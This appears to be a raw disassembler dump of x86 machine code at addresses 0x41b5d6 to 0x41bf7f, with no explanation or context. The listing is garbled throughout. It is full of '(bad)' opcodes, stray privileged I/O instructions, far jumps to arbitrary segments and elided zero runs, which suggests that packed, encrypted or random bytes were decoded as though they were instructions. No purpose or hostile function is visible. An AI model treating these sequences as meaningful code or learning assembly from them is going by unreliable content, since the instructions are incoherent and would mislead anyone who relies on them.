  41b5d6:	ret    0xa24
  41b5d9:	(bad)  
  41b5da:	mov    bh,BYTE PTR [eax-0x3df55997]
  41b5e0:	pusha  
  41b5e1:	push   esi
  41b5e2:	test   al,0x66
  41b5e4:	adc    dl,BYTE PTR [ebx+0x50ec67d0]
  41b5ea:	out    0x9c,al
  41b5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5ed:	(bad)  
  41b5ee:	je     0x41b5ac
  41b5f0:	arpl   WORD PTR [edi+0x16161c78],cx
  41b5f6:	xor    DWORD PTR [ebx-0x4a],ebp
  41b5f9:	inc    edi
  41b5fa:	xchg   ebp,eax
  41b5fb:	sub    DWORD PTR [edi+ebp*4-0x1aa0850c],ebx
  41b602:	add    ecx,DWORD PTR [esi]
  41b604:	inc    ebx
  41b605:	je     0x41b641
  41b607:	mov    edi,0xf6b83097
  41b60c:	or     al,bl
  41b60e:	sar    ebp,0x56
  41b611:	test   DWORD PTR [edi-0x402a1749],0xcd3fab5
  41b61b:	je     0x41b613
  41b61d:	adc    eax,0x641f01d
  41b622:	inc    ecx
  41b623:	inc    esp
  41b624:	pop    ds
  41b625:	test   eax,0x9d4d8384
  41b62a:	push   edx
  41b62b:	dec    esp
  41b62c:	outs   dx,BYTE PTR ds:[esi]
  41b62d:	inc    edi
  41b62e:	cmp    BYTE PTR [esi+0x34ba9ac6],dl
  41b634:	in     eax,0x4e
  41b636:	pop    ds
  41b637:	in     eax,dx
  41b638:	inc    ebp
  41b639:	pushf  
  41b63a:	dec    esi
  41b63b:	pusha  
  41b63c:	(bad)  
  41b63d:	cwde   
  41b63e:	sub    ebx,esp
  41b640:	call   0x3014d3af
  41b645:	dec    esi
  41b646:	push   edi
  41b647:	bound  eax,QWORD PTR [ecx+esi*1]
  41b64a:	pop    ebx
  41b64b:	(bad)  
  41b64c:	loop   0x41b69f
  41b64e:	mov    ebx,DWORD PTR [esi+0x10ff316d]
  41b654:	shl    edx,1
  41b656:	cmp    ecx,ebx
  41b658:	sar    al,cl
  41b65a:	mov    esp,0x4f14cce0
  41b65f:	retf   0xc657
  41b662:	fbstp  TBYTE PTR [esi]
  41b664:	jbe    0x41b5e9
  41b666:	stc    
  41b667:	jecxz  0x41b611
  41b669:	jnp    0x41b6cf
  41b66b:	aas    
  41b66c:	xchg   esp,eax
  41b66e:	imul   ebp,DWORD PTR ds:0xe1903085,0xdb6ffc97
  41b678:	(bad)  
  41b67a:	lock les esi,FWORD PTR [ebp-0x40]
  41b67e:	jne    0x41b613
  41b680:	mov    WORD PTR [ebp*1+0x72dce01d],cs
  41b687:	mov    dh,0x1c
  41b689:	pop    ecx
  41b68a:	adc    BYTE PTR [ebx],0xde
  41b68d:	enter  0xb805,0xc7
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	push   eax
  41b701:	mov    dh,0xf6
  41b703:	sub    DWORD PTR [ebx+eiz*1+0x1],0x10500
  41b70b:	add    BYTE PTR [esi-0x54909949],dl
  41b711:	inc    ebx
  41b712:	in     eax,dx
  41b713:	lds    esp,FWORD PTR [ebp-0x66]
  41b716:	sbb    al,0xf0
  41b718:	adc    ah,BYTE PTR [esi]
  41b71a:	adc    al,0x32
  41b71c:	mov    ds:0xb0acba4d,eax
  41b721:	das    
  41b722:	push   esi
  41b723:	aad    0xbe
  41b725:	into   
  41b726:	outs   dx,DWORD PTR ds:[esi]
  41b727:	outs   dx,BYTE PTR ds:[esi]
  41b728:	xchg   ecx,eax
  41b729:	sti    
  41b72a:	js     0x41b76b
  41b72c:	sub    ecx,edi
  41b72e:	icebp  
  41b72f:	mov    eax,0xee0fed94
  41b734:	pop    es
  41b735:	mov    bh,0x49
  41b737:	mov    esp,0xc95efa51
  41b73c:	in     al,0x5e
  41b73e:	mov    dh,BYTE PTR [ecx+eiz*8-0xd]
  41b742:	jns    0x41b781
  41b744:	xchg   ebp,eax
  41b745:	jne    0x41b6ee
  41b747:	or     al,0x94
  41b749:	push   0x4e
  41b74b:	sub    ebx,DWORD PTR [edi]
  41b74d:	jecxz  0x41b729
  41b74f:	fnclex 
  41b751:	les    edi,FWORD PTR [edx]
  41b753:	out    dx,al
  41b754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b755:	stos   DWORD PTR es:[edi],eax
  41b756:	pop    es
  41b757:	push   ds
  41b758:	cmp    BYTE PTR [ebp+0x5],bh
  41b75b:	dec    ebx
  41b75c:	jo     0x41b794
  41b75e:	loop   0x41b6f1
  41b760:	call   0x1378:0xb70f6f89
  41b767:	cmp    BYTE PTR [ebp+0x5a2fffc4],dl
  41b76d:	mov    ebx,0x37d7deb2
  41b772:	(bad)
  41b775:	mov    DWORD PTR ds:0x7eba88df,0xe625333
  41b77f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b780:	scas   eax,DWORD PTR es:[edi]
  41b781:	xchg   edx,eax
  41b782:	(bad)  
  41b783:	xor    esp,DWORD PTR [esi-0x63]
  41b786:	push   esi
  41b787:	shl    DWORD PTR [ebp+0x4b2267f9],cl
  41b78d:	xor    eax,0x69d9cf41
  41b792:	(bad)  
  41b793:	popf   
  41b794:	inc    eax
  41b795:	bound  edi,QWORD PTR [edi-0x6d2807a8]
  41b79b:	mov    ds:0x81c8acba,al
  41b7a0:	jmp    0xf157ec9
  41b7a5:	push   ds
  41b7a6:	loop   0x41b752
  41b7a8:	push   0x13
  41b7aa:	mov    ebp,0x4f5ffb79
  41b7af:	mov    ah,0x62
  41b7b1:	or     al,0xa0
  41b7b3:	ins    BYTE PTR es:[edi],dx
  41b7b4:	test   DWORD PTR [ebx],eax
  41b7b6:	outs   dx,DWORD PTR ds:[esi]
  41b7b7:	repnz or esi,edi
  41b7ba:	(bad)  [eax-0x55c68759]
  41b7c0:	imul   ecx,DWORD PTR [edi+eiz*8+0x20b83bd6],0xffffff91
  41b7c8:	inc    ecx
  41b7c9:	cmp    BYTE PTR es:[ebp+0x3752a0e4],ah
  41b7d0:	xor    al,0x2b
  41b7d2:	jg     0x41b77a
  41b7d4:	xchg   esi,eax
  41b7d5:	and    al,0xa8
  41b7d7:	jecxz  0x41b78d
  41b7d9:	and    DWORD PTR ds:[ebx],0x206aafdc
  41b7e0:	mov    cs,WORD PTR [esi+0x37]
  41b7e3:	iret   
  41b7e4:	inc    edx
  41b7e5:	bnd ret 
  41b7e7:	or     dx,WORD PTR [ebx+0x2c430d6e]
  41b7ee:	sub    eax,0xc73db7fe
  41b7f3:	ss retf 0x27ac
  41b7f7:	out    0x5,eax
  41b7f9:	add    eax,0xdcc797d4
  41b7fe:	cdq    
  41b7ff:	call   0x233ab52f
  41b804:	loope  0x41b7a2
  41b806:	cmc    
  41b807:	in     eax,0xda
  41b809:	test   DWORD PTR [edi+0x4059d32f],ebp
  41b80f:	add    BYTE PTR [eax+0x0],cl
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x61
  41b881:	mov    bh,0x91
  41b883:	sti    
  41b884:	jno    0x41b8aa
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0x11000001
  41b88d:	sub    ebp,esi
  41b88f:	hlt    
  41b890:	mov    edi,0x4d2be061
  41b895:	sub    BYTE PTR [esi],ch
  41b897:	not    DWORD PTR [ebx]
  41b899:	lods   al,BYTE PTR ds:[esi]
  41b89a:	std    
  41b89b:	test   BYTE PTR [edx+0x3b0a14bc],0x98
  41b8a2:	push   ebp
  41b8a3:	jp     0x41b8ca
  41b8a5:	int    0xb0
  41b8a7:	aaa    
  41b8a8:	das    
  41b8a9:	jnp    0x41b92a
  41b8ab:	scas   al,BYTE PTR es:[edi]
  41b8ac:	jnp    0x41b8c4
  41b8ae:	fwait
  41b8af:	aad    0x21
  41b8b1:	popa   
  41b8b2:	repnz xchg ebx,eax
  41b8b4:	mov    dl,0xdf
  41b8b6:	nop
  41b8b7:	adc    DWORD PTR [edx+0x61],ebp
  41b8ba:	in     eax,dx
  41b8bb:	mov    eax,ds:0xf7c345bd
  41b8c0:	jae    0x41b8d9
  41b8c2:	adc    DWORD PTR [edx+esi*8-0xe8821eb],esp
  41b8c9:	jne    0x41b946
  41b8cb:	gs pop es
  41b8cd:	xor    DWORD PTR [ecx+0x4f8ce97],ebp
  41b8d3:	clc    
  41b8d4:	push   cs
  41b8d5:	mov    cl,0x92
  41b8d7:	call   0xd71a5ff2
  41b8dc:	xchg   ebp,eax
  41b8dd:	adc    bl,ah
  41b8df:	in     al,dx
  41b8e0:	jae    0x41b946
  41b8e2:	(bad)  
  41b8e3:	push   0x3c
  41b8e5:	clc    
  41b8e6:	(bad)  
  41b8e7:	fst    QWORD PTR [ecx+ebp*2-0x37]
  41b8eb:	cmp    BYTE PTR ds:0xbeabc0f,cl
  41b8f1:	cmp    ebx,DWORD PTR [edx+0x54ca6b38]
  41b8f7:	fcmovne st,st(6)
  41b8f9:	cmp    eax,0x7d3a87b1
  41b8fe:	js     0x41b947
  41b900:	push   ecx
  41b901:	sub    ebx,DWORD PTR [esi]
  41b903:	adc    DWORD PTR [edx-0x41222fd],ebp
  41b909:	xchg   edx,eax
  41b90a:	fwait
  41b90b:	xor    al,0x8d
  41b90d:	fsubr  st,st(7)
  41b90f:	dec    esp
  41b910:	push   cs
  41b911:	sbb    cl,BYTE PTR [esi-0x1c325dc6]
  41b917:	adc    al,0x62
  41b919:	retf   0x8ef7
  41b91c:	pop    ds
  41b91d:	cmp    dl,BYTE PTR [edx-0x716c2b11]
  41b923:	fsub   QWORD PTR [ebp-0x69eebdd2]
  41b929:	int    0xbe
  41b92b:	mov    ah,0x85
  41b92d:	aam    0x49
  41b92f:	cld    
  41b930:	mov    bl,0xae
  41b932:	jl     0x41b8c2
  41b934:	mov    edx,0x3bc2d408
  41b939:	into   
  41b93a:	cmp    al,0x40
  41b93c:	sbb    dh,0x75
  41b93f:	push   ecx
  41b940:	scas   al,BYTE PTR es:[edi]
  41b941:	ins    DWORD PTR es:[edi],dx
  41b942:	sub    al,0xea
  41b944:	pop    esi
  41b945:	mov    ah,0xaf
  41b947:	ret    0x2130
  41b94a:	test   al,0xda
  41b94c:	xor    dl,BYTE PTR [ebp-0x2993782a]
  41b952:	in     al,0x17
  41b954:	pop    es
  41b955:	pop    ebp
  41b956:	sub    BYTE PTR [edi-0x5a],ah
  41b959:	dec    edx
  41b95a:	in     eax,dx
  41b95b:	data16 js 0x41b8e2
  41b95e:	add    DWORD PTR [edi],edi
  41b960:	dec    eax
  41b961:	xchg   ecx,eax
  41b962:	add    al,0xea
  41b964:	add    BYTE PTR [ebx-0x6bc5ae48],ah
  41b96a:	in     eax,0x27
  41b96c:	aaa    
  41b96d:	sahf   
  41b96e:	jg     0x41b9c9
  41b970:	mov    BYTE PTR [edi],al
  41b972:	mov    BYTE PTR [ecx-0x7c],ch
  41b975:	pop    edi
  41b976:	sub    BYTE PTR [edi+edx*4],dl
  41b979:	pop    edx
  41b97a:	sbb    al,0x51
  41b97c:	es and al,0x60
  41b97f:	add    esp,edi
  41b981:	mov    ebp,0xa1b358ae
  41b986:	mov    bl,0x96
  41b988:	sbb    al,0x3a
  41b98a:	xchg   esp,eax
  41b98b:	std    
  41b98c:	rcr    esi,0x2
  41b98f:	sbb    BYTE PTR [eax+eax*1+0x0],0x0
	...
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	bound  edx,QWORD PTR [esi]
  41ba02:	sbb    eax,0x1257613
  41ba07:	add    BYTE PTR ds:0x5b000001,al
  41ba0d:	lock mov dl,0x71
  41ba10:	je     0x41ba16
  41ba12:	mov    esp,DWORD PTR [edi+0x67fe7a8e]
  41ba18:	adc    DWORD PTR [edi-0x1a],0xfffffff3
  41ba1c:	mov    dl,0xbc
  41ba1e:	xchg   ebx,eax
  41ba1f:	xlat   BYTE PTR ds:[ebx]
  41ba20:	outs   dx,BYTE PTR ds:[esi]
  41ba21:	mov    cl,0xb4
  41ba23:	sbb    al,0x82
  41ba25:	jo     0x41ba18
  41ba27:	add    bl,BYTE PTR [edi-0x2f]
  41ba2a:	dec    eax
  41ba2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba2c:	popf   
  41ba2d:	mov    dh,0x3d
  41ba2f:	and    DWORD PTR [ecx+0x77446e2c],edi
  41ba35:	in     al,dx
  41ba36:	add    BYTE PTR [edx+esi*2-0x31],al
  41ba3a:	ret    0xcb1b
  41ba3d:	xchg   ebx,eax
  41ba3e:	xor    dl,ch
  41ba40:	cmp    BYTE PTR [ebx-0x6a25b5fc],0x29
  41ba47:	into   
  41ba48:	push   ss
  41ba49:	out    dx,eax
  41ba4a:	test   dl,al
  41ba4c:	jne    0x41ba86
  41ba4e:	push   0xe082c10d
  41ba53:	daa    
  41ba54:	jns    0x41b9e6
  41ba56:	or     ebp,DWORD PTR [ebx+0x10]
  41ba59:	cmp    eax,0xd164f864
  41ba5e:	xchg   ebx,eax
  41ba5f:	and    BYTE PTR [ebx+0x31a5b3f1],al
  41ba65:	or     ebx,eax
  41ba67:	dec    ebp
  41ba68:	pop    ebp
  41ba69:	jl     0x41ba5d
  41ba6b:	jnp    0x41bacd
  41ba6d:	sub    eax,0x3ece4e16
  41ba72:	out    0x31,al
  41ba74:	std    
  41ba75:	pop    edi
  41ba76:	jg     0x41bad5
  41ba78:	iret   
  41ba79:	imul   edi,DWORD PTR [eax-0x72],0xffffffd4
  41ba7d:	or     al,0xdf
  41ba7f:	adc    BYTE PTR [eax-0x16],bl
  41ba82:	dec    esi
  41ba83:	add    dh,BYTE PTR [esi-0x45]
  41ba86:	mov    eax,0x53c2477f
  41ba8b:	pop    ecx
  41ba8c:	loopne 0x41baec
  41ba8e:	and    esp,DWORD PTR [esi+ebp*2]
  41ba91:	cmp    ebp,ebp
  41ba93:	test   DWORD PTR [edx+0x2c],esi
  41ba96:	enter  0x223c,0x40
  41ba9a:	pusha  
  41ba9b:	enter  0xdad7,0x2b
  41ba9f:	xor    DWORD PTR [esi],ebp
  41baa1:	jb     0x41baa6
  41baa3:	mov    DWORD PTR [ebx-0x2],edx
  41baa6:	xchg   ecx,eax
  41baa7:	hlt    
  41baa8:	push   ss
  41baa9:	out    dx,al
  41baaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baab:	ins    BYTE PTR es:[edi],dx
  41baac:	sub    al,0x6
  41baae:	pop    ebp
  41baaf:	inc    esp
  41bab0:	fucomip st,st(1)
  41bab2:	paddusw mm0,QWORD PTR [esi-0x6e831f81]
  41bab9:	and    ch,BYTE PTR [esi-0x28]
  41babc:	jo     0x41ba63
  41babe:	mov    ebp,0xd1f43d35
  41bac3:	mov    DWORD PTR [edi],0x68132e3d
  41bac9:	add    DWORD PTR [esi-0x64aaf897],ebp
  41bacf:	cli    
  41bad0:	push   cs
  41bad1:	ds pop ebx
  41bad3:	jg     0x41ba86
  41bad5:	icebp  
  41bad6:	fisttp DWORD PTR ds:0x3e81b05a
  41badc:	jae    0x41bb45
  41bade:	je     0x41bad4
  41bae0:	xor    eax,0x6309d799
  41bae5:	xchg   BYTE PTR [edi+0x6c],al
  41bae8:	loopne 0x41ba9f
  41baea:	out    dx,al
  41baeb:	mov    dh,0x33
  41baed:	jg     0x41bb27
  41baef:	cvttps2pi mm5,QWORD PTR [edx]
  41baf2:	mov    eax,0x464670b4
  41baf7:	add    ebx,ecx
  41baf9:	or     eax,0x61c1e276
  41bafe:	jnp    0x41ba8e
  41bb00:	xor    al,0x7d
  41bb02:	xlat   BYTE PTR ds:[ebx]
  41bb03:	sahf   
  41bb04:	ffreep st(6)
  41bb06:	enter  0xd66c,0x83
  41bb0a:	mov    al,ds:0x440cba0b
  41bb0f:	sbb    ecx,ebp
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x5f],cx
  41bb81:	push   ebx
  41bb82:	mov    esp,0x1267bfe
  41bb87:	add    BYTE PTR ds:0x78000001,al
  41bb8d:	xchg   edi,eax
  41bb8e:	call   0x4bd2:0x43845a70
  41bb95:	add    BYTE PTR [ecx+0x40],ch
  41bb98:	jl     0x41bb7f
  41bb9a:	and    BYTE PTR [eax],0x38
  41bb9d:	shr    ch,0x56
  41bba0:	lds    edi,FWORD PTR [ecx]
  41bba2:	clc    
  41bba3:	push   ebx
  41bba4:	stos   DWORD PTR es:[edi],eax
  41bba5:	js     0x41bbbf
  41bba7:	rcl    BYTE PTR [esi+0xe240230],0x21
  41bbae:	icebp  
  41bbaf:	cmp    ecx,DWORD PTR [ebp+ebx*2-0x15]
  41bbb3:	loope  0x41bbf1
  41bbb5:	or     al,0x79
  41bbb7:	and    eax,DWORD PTR [ecx+0x27]
  41bbba:	inc    edi
  41bbbb:	enter  0xb8f8,0x8b
  41bbbf:	jbe    0x41bbd6
  41bbc1:	mov    eax,ds:0x629d05cf
  41bbc6:	not    DWORD PTR [esi]
  41bbc8:	sub    BYTE PTR [ebx-0x66],dh
  41bbcb:	mov    ds:0x3e5a4e21,eax
  41bbd0:	in     eax,dx
  41bbd1:	mov    WORD PTR [ecx+0x3669bc05],es
  41bbd7:	xor    BYTE PTR [edx+0x7c],dl
  41bbda:	mov    dh,0x80
  41bbdc:	je     0x41bc59
  41bbde:	cmp    ecx,esi
  41bbe0:	pop    es
  41bbe1:	or     DWORD PTR [esi],eax
  41bbe3:	iret   
  41bbe4:	xor    BYTE PTR [ebp+0xaeab4fb],bh
  41bbea:	fwait
  41bbeb:	cld    
  41bbec:	and    bl,BYTE PTR ds:0xd77c1999
  41bbf2:	pop    esp
  41bbf3:	pop    ebp
  41bbf4:	lahf   
  41bbf5:	enter  0x6cbd,0x28
  41bbf9:	mov    esp,0xbb418a83
  41bbfe:	push   cs
  41bbff:	outs   dx,BYTE PTR ds:[esi]
  41bc00:	mov    ds:0x70ca664b,al
  41bc05:	fimul  WORD PTR [esi+edi*1+0xd]
  41bc09:	mov    esp,0xf1066e5f
  41bc0e:	mov    cl,0xdb
  41bc10:	pop    es
  41bc11:	sbb    edx,DWORD PTR [edx-0x67]
  41bc14:	sbb    eax,0x9a8ae845
  41bc19:	int    0xd8
  41bc1b:	clc    
  41bc1c:	xor    DWORD PTR [eax+0x18],eax
  41bc1f:	jg     0x41bc9c
  41bc21:	mov    eax,DWORD PTR [esp+edx*2+0x2caf82b4]
  41bc28:	in     eax,0x5d
  41bc2a:	sbb    al,0xb8
  41bc2c:	inc    ecx
  41bc2d:	jmp    0x8869:0x205907d6
  41bc34:	or     DWORD PTR [esi+edi*2+0x14],ebp
  41bc38:	cmp    ebx,DWORD PTR [edi-0x659625a6]
  41bc3e:	dec    edx
  41bc3f:	outs   dx,DWORD PTR ds:[esi]
  41bc40:	into   
  41bc41:	fsubrp st(7),st
  41bc43:	mov    dl,0x95
  41bc45:	xor    ebx,esi
  41bc47:	int3   
  41bc48:	es loopne 0x41bc8e
  41bc4b:	frstpm(287 only) 
  41bc4d:	xchg   esi,eax
  41bc4e:	jnp    0x41bc1d
  41bc50:	xchg   ecx,eax
  41bc51:	cmp    eax,DWORD PTR [eax+0x2b]
  41bc54:	sub    ch,bl
  41bc56:	fsub   DWORD PTR [ebp+0x9aaf2f6]
  41bc5c:	lahf   
  41bc5d:	out    0x45,eax
  41bc5f:	push   ds
  41bc60:	add    eax,0xd73cbd72
  41bc65:	jg     0x41bc26
  41bc67:	sahf   
  41bc68:	mov    dh,0x39
  41bc6a:	mov    edi,0x846f183c
  41bc6f:	retf   
  41bc70:	test   al,0x7c
  41bc73:	cmp    al,0x6f
  41bc75:	xor    al,0x1
  41bc77:	nop
  41bc78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc79:	in     al,0xc1
  41bc7b:	aas    
  41bc7c:	ins    BYTE PTR es:[edi],dx
  41bc7d:	mov    eax,ds:0x59e3fa45
  41bc82:	clc    
  41bc83:	outs   dx,BYTE PTR ds:[esi]
  41bc84:	add    cl,BYTE PTR [eax]
  41bc86:	jae    0x41bcc2
  41bc88:	(bad)  
  41bc89:	fimul  WORD PTR [edi-0x3594726c]
  41bc8f:	pop    ds
  41bc90:	jmp    0x0:0x0
	...
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x105d9d8
  41bd02:	(bad)  
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x9e000001,al
  41bd0d:	and    DWORD PTR [ebx],edi
  41bd0f:	xor    DWORD PTR [edx-0x7d],eax
  41bd12:	out    0xd6,eax
  41bd14:	scas   al,BYTE PTR es:[edi]
  41bd15:	je     0x41bcbf
  41bd17:	pop    ebp
  41bd18:	enter  0xabb3,0x36
  41bd1c:	pop    edi
  41bd1d:	(bad)  
  41bd1e:	fdivr  st,st(3)
  41bd20:	and    eax,DWORD PTR ds:0xc321bf20
  41bd26:	or     eax,0x46ee4d8c
  41bd2b:	jmp    0x41bd81
  41bd2d:	mov    ah,0x1c
  41bd2f:	popa   
  41bd30:	inc    ebx
  41bd31:	sbb    ebx,DWORD PTR [eax+0x20b3624e]
  41bd37:	xrelease mov DWORD PTR [eax],esi
  41bd3a:	xchg   DWORD PTR [ebx+0x69cca30b],edi
  41bd40:	cdq    
  41bd41:	adc    esi,DWORD PTR [edx]
  41bd43:	loope  0x41bcc9
  41bd45:	cli    
  41bd46:	call   0x43e9:0x32291cb
  41bd4d:	dec    esp
  41bd4e:	cmc    
  41bd4f:	push   esi
  41bd50:	push   esi
  41bd51:	fwait
  41bd52:	add    dl,BYTE PTR [ebp+0x3e]
  41bd55:	xor    al,0x96
  41bd57:	or     eax,0x959c1689
  41bd5c:	(bad)  
  41bd5d:	sub    al,0xa6
  41bd5f:	inc    esi
  41bd60:	(bad)  
  41bd62:	repz cmp BYTE PTR [esi],dh
  41bd65:	xchg   edx,eax
  41bd66:	stc    
  41bd67:	xchg   ebp,eax
  41bd68:	cwde   
  41bd69:	ret    0xee03
  41bd6c:	lahf   
  41bd6d:	mov    ecx,0x55493728
  41bd72:	ret    
  41bd73:	push   ecx
  41bd74:	xor    bh,BYTE PTR [edx-0x59b927a3]
  41bd7a:	in     eax,dx
  41bd7b:	pop    ds
  41bd7c:	outs   dx,DWORD PTR ds:[esi]
  41bd7d:	dec    edi
  41bd7e:	in     al,0x21
  41bd80:	arpl   WORD PTR [ecx-0x6c],sp
  41bd83:	call   0xb8c5:0xe4df3a8c
  41bd8a:	(bad)  
  41bd8b:	daa    
  41bd8c:	cdq    
  41bd8d:	shl    DWORD PTR [ebx+0x73],1
  41bd90:	(bad)  
  41bd91:	pop    edx
  41bd92:	sub    eax,0x8d19a83b
  41bd97:	cdq    
  41bd98:	xor    eax,0xb96532b8
  41bd9d:	loop   0x41bd83
  41bd9f:	loope  0x41bd45
  41bda1:	pop    ebx
  41bda2:	fadd   QWORD PTR [edi]
  41bda4:	xchg   BYTE PTR [ebx-0x36],al
  41bda7:	inc    ebx
  41bda8:	add    ecx,DWORD PTR [edi]
  41bdaa:	rcr    DWORD PTR [edx-0x6f],1
  41bdad:	or     BYTE PTR [edi-0x56],bh
  41bdb0:	mov    WORD PTR [edx],?
  41bdb2:	(bad)  
  41bdb3:	push   ds
  41bdb4:	jmp    0x1ff3:0xe8ff4d78
  41bdbb:	dec    ebx
  41bdbc:	scas   eax,DWORD PTR es:[edi]
  41bdbd:	scas   eax,DWORD PTR es:[edi]
  41bdbe:	adc    DWORD PTR [ebp-0x32ce7ee0],esp
  41bdc4:	cmp    al,0x58
  41bdc6:	xor    esi,ecx
  41bdc8:	jl     0x41be0e
  41bdca:	test   BYTE PTR [edx-0x2dab61e4],ch
  41bdd0:	dec    edi
  41bdd1:	pop    ebp
  41bdd2:	push   esp
  41bdd3:	ret    0x10f5
  41bdd6:	mov    edx,0x3f2a37e1
  41bddb:	ja     0x41bdf8
  41bddd:	jb     0x41be3d
  41bddf:	outs   dx,DWORD PTR ds:[esi]
  41bde0:	ins    DWORD PTR es:[edi],dx
  41bde1:	xor    cl,al
  41bde3:	fsub   DWORD PTR [eax]
  41bde5:	mov    ds:0x2dbd6fcb,al
  41bdeb:	cmp    bh,ch
  41bded:	(bad)  
  41bdee:	sti    
  41bdef:	mov    cl,0xde
  41bdf1:	in     eax,0x5f
  41bdf3:	sbb    ecx,ebx
  41bdf5:	pusha  
  41bdf6:	push   ecx
  41bdf7:	xchg   ecx,eax
  41bdf8:	or     DWORD PTR [ecx+ebx*1-0x4c011273],eax
  41bdff:	mov    edi,0xccda7b7f
  41be04:	int3   
  41be05:	das    
  41be06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be08:	and    ah,ch
  41be0a:	leave  
  41be0b:	mov    cl,0x49
  41be0d:	inc    ecx
  41be0e:	xlat   BYTE PTR ds:[ebx]
  41be0f:	pop    ecx
  41be10:	push   cs
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0x48683f66]
  41be82:	psadbw mm0,QWORD PTR [ebp+0x5000128]
  41be89:	add    DWORD PTR [eax],eax
  41be8b:	add    cl,bh
  41be8d:	cmp    eax,0xa2acb810
  41be92:	dec    edi
  41be93:	loope  0x41bea9
  41be95:	sub    eax,0xb4bd1b42
  41be9a:	inc    edx
  41be9b:	adc    DWORD PTR [edi+0x7b959c5c],esp
  41bea1:	push   edi
  41bea2:	ret    0x2303
  41bea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bea6:	mov    DWORD PTR [esi*4-0x222a0bef],esi
  41bead:	pop    esi
  41beae:	dec    ebx
  41beaf:	repnz add BYTE PTR [esi+0x7396d03e],ah
  41beb6:	push   esp
  41beb7:	cdq    
  41beb8:	xchg   esi,eax
  41beb9:	mov    al,ds:0xbcfa2eb5
  41bebe:	mov    al,0xd6
  41bec0:	(bad)  
  41bec2:	sub    ecx,DWORD PTR [ebx+0x40418e88]
  41bec8:	jno    0x41bf19
  41beca:	cmp    BYTE PTR [eax+0x4179bcc1],0x8d
  41bed1:	and    DWORD PTR [ebx+0x323b970c],edx
  41bed7:	sub    ecx,esp
  41bed9:	inc    ebx
  41beda:	lods   eax,DWORD PTR ds:[esi]
  41bedb:	loopne 0x41beea
  41bedd:	xchg   ebx,eax
  41bede:	jecxz  0x41be7f
  41bee0:	aaa    
  41bee1:	sbb    BYTE PTR [eax+0x458e58b3],bl
  41bee7:	cmp    edi,esi
  41bee9:	push   eax
  41beea:	retf   
  41beeb:	and    eax,0x131fd282
  41bef0:	cmp    bh,BYTE PTR [ebx-0x26]
  41bef3:	std    
  41bef4:	adc    BYTE PTR [eax-0x71743f37],ah
  41befa:	nop
  41befb:	inc    ecx
  41befc:	jmp    FWORD PTR [eax]
  41befe:	pusha  
  41beff:	mov    ebx,0x48595f19
  41bf05:	lea    esi,[eax-0x19]
  41bf08:	dec    ebx
  41bf09:	fnstcw WORD PTR [ecx+0x7b]
  41bf0c:	mov    edx,0x1df86fcb
  41bf11:	cmp    BYTE PTR [ebx-0x3c61f2d7],al
  41bf17:	pop    edx
  41bf18:	shr    DWORD PTR [ecx-0x718d9340],cl
  41bf1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf1f:	xor    al,0x8b
  41bf21:	std    
  41bf22:	(bad)  
  41bf23:	and    dh,bl
  41bf25:	jecxz  0x41bf32
  41bf27:	(bad)  
  41bf29:	outs   dx,DWORD PTR ds:[esi]
  41bf2a:	mov    BYTE PTR [ebp+ebx*2+0x20],bl
  41bf2e:	jnp    0x41bf65
  41bf30:	loop   0x41bf1f
  41bf32:	or     eax,0x83cb035c
  41bf37:	sub    ebp,eax
  41bf39:	mov    bl,0x38
  41bf3b:	fs mov ah,ch
  41bf3e:	fsub   DWORD PTR [eax-0x57]
  41bf41:	or     BYTE PTR [edx],bl
  41bf43:	sbb    DWORD PTR [esi],edx
  41bf45:	xor    al,0xb3
  41bf47:	dec    ebp
  41bf48:	push   ds
  41bf49:	or     DWORD PTR ds:0x2ad37978,eax
  41bf4f:	sub    DWORD PTR [eax-0x70],ebx
  41bf52:	cmp    edi,0x2fefb01a
  41bf58:	nop
  41bf59:	or     ah,ch
  41bf5b:	mov    eax,ds:0x9524d95a
  41bf60:	xor    BYTE PTR [edi-0x69],cl
  41bf63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf64:	push   0x6
  41bf66:	sbb    al,0x4b
  41bf68:	inc    BYTE PTR [ecx]
  41bf6a:	daa    
  41bf6b:	cmp    bh,BYTE PTR [ebp-0xe]
  41bf6e:	xchg   esp,eax
  41bf6f:	into   
  41bf70:	cmc    
  41bf71:	mov    esp,0x4c53e5f2
  41bf76:	enter  0x7b79,0xc4
  41bf7a:	mov    al,ds:0xb5bf67d2
  41bf7f:	gs retf 0x8d03
